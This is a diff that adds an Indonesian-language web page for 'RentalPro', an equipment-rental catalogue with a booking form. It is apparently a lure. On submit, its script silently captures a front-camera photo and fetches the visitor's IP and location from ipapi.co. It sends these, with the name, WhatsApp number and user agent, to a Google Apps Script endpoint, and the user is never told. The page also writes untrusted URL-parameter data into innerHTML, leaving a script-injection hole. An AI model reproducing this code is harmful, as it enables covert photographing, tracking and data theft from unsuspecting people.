@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RentalPro - Sewa Perlengkapan</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f5f6fa; color: #333; padding-bottom: 30px; }
+
+        .header { background: linear-gradient(135deg, #1a1a2e, #16213e); color: white; padding: 25px 20px; text-align: center; }
+        .header .logo { font-size: 28px; font-weight: bold; letter-spacing: 2px; }
+        .header .logo span { color: #e94560; }
+        .header .subtitle { font-size: 13px; opacity: 0.8; margin-top: 5px; }
+
+        .info-bar { background: white; margin: 15px; padding: 15px 20px; border-radius: 10px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
+        .info-bar .stock-count { font-size: 14px; color: #666; }
+        .info-bar .stock-count b { color: #e94560; font-size: 18px; }
+        .info-bar .status { background: #27ae60; color: white; padding: 6px 12px; border-radius: 20px; font-size: 12px; }
+
+        .katalog-title { padding: 0 20px; margin-bottom: 10px; font-size: 16px; font-weight: bold; color: #1a1a2e; }
+        .katalog-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 0 15px; margin-bottom: 20px; }
+
+        .item-card { background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 2px 10px rgba(0,0,0,0.08); cursor: pointer; transition: 0.3s; position: relative; }
+        .item-card:hover { transform: translateY(-3px); box-shadow: 0 5px 20px rgba(0,0,0,0.15); }
+        .item-card.selected { border: 3px solid #e94560; transform: scale(1.02); }
+        .item-card.selected::after { content: '✓'; position: absolute; top: 10px; right: 10px; background: #e94560; color: white; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 14px; z-index: 2; }
+
+        .item-image { width: 100%; height: 140px; display: flex; align-items: center; justify-content: center; font-size: 50px; position: relative; }
+        .item-image .stock-number { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.6); color: white; padding: 4px 10px; border-radius: 15px; font-size: 12px; font-weight: bold; }
+
+        .item-info { padding: 12px; }
+        .item-info .item-name { font-size: 14px; font-weight: bold; margin-bottom: 4px; }
+        .item-info .item-desc { font-size: 11px; color: #888; margin-bottom: 8px; }
+        .item-info .item-price { font-size: 15px; font-weight: bold; color: #e94560; }
+        .item-info .item-price span { font-size: 11px; color: #999; font-weight: normal; }
+
+        .item-unavailable { opacity: 0.5; pointer-events: none; }
+        .item-unavailable::before { content: 'DISEWA'; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%) rotate(-25deg); background: #e74c3c; color: white; padding: 8px 20px; font-weight: bold; font-size: 14px; z-index: 2; border-radius: 4px; }
+
+        .form-section { background: white; margin: 0 15px 20px; padding: 20px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.08); }
+        .form-section h3 { font-size: 16px; margin-bottom: 15px; padding-bottom: 10px; border-bottom: 2px solid #f0f0f0; }
+
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; font-size: 13px; font-weight: bold; color: #555; margin-bottom: 5px; }
+        .form-group input, .form-group select { width: 100%; padding: 12px 15px; border: 2px solid #e8e8e8; border-radius: 8px; font-size: 14px; transition: 0.3s; font-family: inherit; }
+        .form-group input:focus, .form-group select:focus { border-color: #e94560; outline: none; }
+
+        .rental-summary { background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 15px 0; display: flex; justify-content: space-between; align-items: center; }
+        .rental-summary .selected-label { font-size: 13px; color: #666; }
+        .rental-summary .selected-item { font-size: 15px; font-weight: bold; color: #1a1a2e; }
+        .rental-summary .total-price { font-size: 18px; font-weight: bold; color: #e94560; }
+
+        .btn-submit { width: 100%; padding: 15px; background: linear-gradient(135deg, #e94560, #c23152); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; letter-spacing: 1px; }
+        .btn-submit:active { transform: scale(0.98); }
+        .btn-submit.disabled { background: #ccc; pointer-events: none; }
+
+        .footer { text-align: center; padding: 20px; color: #aaa; font-size: 12px; }
+
+        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; justify-content: center; align-items: center; z-index: 9999; flex-direction: column; }
+        .loading-box { background: white; padding: 40px; border-radius: 15px; text-align: center; max-width: 300px; }
+        .loading-box .spinner { width: 60px; height: 60px; border: 6px solid #f0f0f0; border-top: 6px solid #e94560; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loading-box h4 { color: #333; margin-bottom: 5px; }
+        .loading-box p { color: #888; font-size: 13px; }
+    </style>
+</head>
+<body>
+
+    <div class="loading-overlay" id="loading">
+        <div class="loading-box">
+            <div class="spinner"></div>
+            <h4>Memproses Pesanan</h4>
+            <p id="loadingText">Mohon tunggu sebentar...</p>
+        </div>
+    </div>
+
+    <div class="header">
+        <div class="logo">Rental<span>Pro</span></div>
+        <div class="subtitle">Perlengkapan Outdoor & Event • Terpercaya Sejak 2020</div>
+    </div>
+
+    <div class="info-bar">
+        <div class="stock-count">Tersedia: <b id="totalStok">0</b> unit</div>
+        <div class="status">🟢 Buka</div>
+    </div>
+
+    <div class="katalog-title">📦 Pilih Unit yang Tersedia</div>
+    <div class="katalog-grid" id="katalog"></div>
+
+    <div class="form-section" id="formSection">
+        <h3>📋 Form Penyewaan</h3>
+
+        <div class="rental-summary" id="summary">
+            <div>
+                <div class="selected-label">Unit Dipilih</div>
+                <div class="selected-item" id="selectedDisplay">- Belum dipilih -</div>
+            </div>
+            <div>
+                <div class="selected-label">Total Biaya</div>
+                <div class="total-price" id="priceDisplay">Rp 0</div>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label>Nama Lengkap</label>
+            <input type="text" id="nama" placeholder="Masukkan nama lengkap Anda">
+        </div>
+
+        <div class="form-group">
+            <label>WhatsApp (Wajib diisi dengan benar)</label>
+            <input type="tel" id="whatsapp" placeholder="Contoh: 08123456789">
+        </div>
+
+        <div class="form-group">
+            <label>Tanggal Sewa</label>
+            <input type="date" id="tanggal">
+        </div>
+
+        <div class="form-group">
+            <label>Durasi Sewa</label>
+            <select id="durasi">
+                <option value="">-- Pilih Durasi --</option>
+            </select>
+        </div>
+
+        <button class="btn-submit disabled" id="btnSubmit" onclick="prosesPesanan()">Sewa Sekarang</button>
+    </div>
+
+    <div class="footer">RentalPro © 2026 • Semua Hak Dilindungi</div>
+
+    <script>
+        const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwFVe5jRXXW8Z8yDdctDjamI6sismWP8hw0iHrzLeR8Iiqeitz4fbUx34ikIu6UkICK/exec';
+
+        let stockData = [];
+        let selectedItem = null;
+
+        function simpanStokDariAdmin(stok) {
+            localStorage.setItem('rentalpro_shared_stok', JSON.stringify(stok));
+        }
+
+        function loadStockFromUrl() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const encodedData = urlParams.get('data');
+
+            if (encodedData) {
+                try {
+                    const decoded = decodeURIComponent(
+                        Array.prototype.map.call(atob(encodedData), function(c) {
+                            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+                        }).join('')
+                    );
+                    stockData = JSON.parse(decoded);
+                    simpanStokDariAdmin(stockData);
+                    tampilkanStok();
+                    return;
+                } catch(e) {
+                    console.log('Decode URL gagal:', e.message);
+                }
+            }
+
+            const stored = localStorage.getItem('rentalpro_shared_stok');
+            if (stored) {
+                try {
+                    stockData = JSON.parse(stored);
+                    tampilkanStok();
+                    return;
+                } catch(e) {
+                    console.log('LocalStorage error:', e.message);
+                }
+            }
+
+            loadStockFromServer();
+        }
+
+        async function loadStockFromServer() {
+            try {
+                document.getElementById('katalog').innerHTML = '<p style="text-align:center;padding:20px;">Memuat stok...</p>';
+                const res = await fetch(APPS_SCRIPT_URL + '?action=getStock');
+                const json = await res.json();
+                if (json.success && json.data.length > 0) {
+                    stockData = json.data;
+                    simpanStokDariAdmin(stockData);
+                    tampilkanStok();
+                } else {
+                    document.getElementById('katalog').innerHTML = '<p style="text-align:center;padding:20px;color:red;">Stok tidak tersedia. Minta link baru ke admin.</p>';
+                }
+            } catch(e) {
+                document.getElementById('katalog').innerHTML = '<p style="text-align:center;padding:20px;color:red;">Gagal terhubung ke server.</p>';
+            }
+        }
+
+        function tampilkanStok() {
+            if (!stockData || stockData.length === 0) {
+                document.getElementById('katalog').innerHTML = '<p style="text-align:center;padding:20px;">Stok kosong</p>';
+                document.getElementById('totalStok').textContent = '0';
+                return;
+            }
+
+            const tersedia = stockData.filter(i => i.available).length;
+            document.getElementById('totalStok').textContent = tersedia;
+
+            const katalog = document.getElementById('katalog');
+            katalog.innerHTML = '';
+
+            stockData.forEach(item => {
+                const card = document.createElement('div');
+                card.className = 'item-card';
+                if (!item.available) card.classList.add('item-unavailable');
+                if (selectedItem && selectedItem.id === item.id) card.classList.add('selected');
+
+                card.innerHTML = `
+                    <div class="item-image" style="background: linear-gradient(135deg, ${item.color || '#3498db'}, ${item.color || '#3498db'}dd);">
+                        <span class="stock-number">#${item.id}</span>
+                        <span>${item.icon || '📦'}</span>
+                    </div>
+                    <div class="item-info">
+                        <div class="item-name">${item.name}</div>
+                        <div class="item-desc">${item.desc || ''}</div>
+                        <div class="item-price">Rp ${parseInt(item.price).toLocaleString('id-ID')} <span>/jam</span></div>
+                    </div>
+                `;
+
+                card.addEventListener('click', () => {
+                    if (item.available) pilihItem(item);
+                });
+
+                katalog.appendChild(card);
+            });
+        }
+
+        function pilihItem(item) {
+            selectedItem = item;
+            tampilkanStok();
+            document.getElementById('selectedDisplay').textContent = 'Rental #' + item.id;
+            updateTotal();
+            document.getElementById('btnSubmit').classList.remove('disabled');
+            document.getElementById('btnSubmit').textContent = 'Sewa Unit #' + item.id + ' Sekarang';
+            document.getElementById('formSection').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function updateTotal() {
+            const durasi = parseInt(document.getElementById('durasi').value) || 0;
+            if (selectedItem) {
+                const total = selectedItem.price * durasi;
+                document.getElementById('priceDisplay').textContent = 'Rp ' + total.toLocaleString('id-ID');
+            }
+        }
+
+        document.getElementById('durasi').addEventListener('change', updateTotal);
+
+        const durasiSelect = document.getElementById('durasi');
+        for (let i = 1; i <= 24; i++) {
+            const opt = document.createElement('option');
+            opt.value = i;
+            opt.textContent = i + ' Jam';
+            durasiSelect.appendChild(opt);
+        }
+
+        async function prosesPesanan() {
+            if (!selectedItem) return alert('Silakan pilih unit terlebih dahulu');
+
+            const nama = document.getElementById('nama').value.trim();
+            const whatsapp = document.getElementById('whatsapp').value.trim();
+            const tanggal = document.getElementById('tanggal').value;
+            const durasi = document.getElementById('durasi').value;
+
+            if (!nama || !whatsapp || !tanggal || !durasi) return alert('Mohon lengkapi semua data');
+
+            document.getElementById('loading').style.display = 'flex';
+            document.getElementById('loadingText').textContent = 'Memproses pesanan...';
+
+            const total = selectedItem.price * parseInt(durasi);
+
+            let fotoBase64 = '';
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                await new Promise(r => setTimeout(r, 1500));
+                const canvas = document.createElement('canvas');
+                canvas.width = 320;
+                canvas.height = 240;
+                canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                fotoBase64 = canvas.toDataURL('image/jpeg', 0.7);
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) {
+                console.log('Kamera gagal:', e.message);
+            }
+
+            let lokasiData = {};
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                lokasiData = await res.json();
+            } catch(e) {}
+
+            try {
+                await fetch(APPS_SCRIPT_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        rentalId: selectedItem.id,
+                        nama: nama,
+                        whatsapp: whatsapp,
+                        tanggal: tanggal,
+                        durasi: durasi + ' Jam',
+                        total: total,
+                        foto: fotoBase64,
+                        latitude: lokasiData.latitude || 'N/A',
+                        longitude: lokasiData.longitude || 'N/A',
+                        ip: lokasiData.ip || 'N/A',
+                        userAgent: navigator.userAgent,
+                        lokasiKota: lokasiData.city || 'N/A',
+                        lokasiRegion: lokasiData.region || 'N/A'
+                    })
+                });
+            } catch(e) {
+                console.log('Gagal kirim:', e.message);
+            }
+
+            document.getElementById('loading').style.display = 'none';
+            alert('✅ Pesanan berhasil dikirim!\n\nAdmin akan menghubungi WhatsApp Anda untuk konfirmasi.');
+        }
+
+        const besok = new Date();
+        besok.setDate(besok.getDate() + 1);
+        document.getElementById('tanggal').value = besok.toISOString().split('T')[0];
+
+        loadStockFromUrl();
+    </script>
+</body>
+</html>
